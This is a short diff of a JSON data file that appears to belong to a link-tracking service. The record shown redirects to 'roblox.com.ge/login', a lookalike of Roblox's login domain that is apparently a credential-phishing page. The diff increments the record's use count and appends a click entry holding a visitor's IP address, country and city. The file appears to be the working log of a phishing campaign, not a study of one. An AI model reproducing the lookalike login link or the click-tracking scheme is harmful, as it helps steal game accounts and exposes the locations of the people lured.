@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1378,
+    "useCount": 1379,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11192,6 +11192,14 @@
         "city": "Jundiaí",
         "flag": "🇧🇷",
         "countryCode": "BR"
+      },
+      {
+        "timestamp": 1777421984270,
+        "ip": "45.82.64.222",
+        "country": "Netherlands",
+        "city": "Naaldwijk",
+        "flag": "🇳🇱",
+        "countryCode": "NL"
       }
     ]
   },
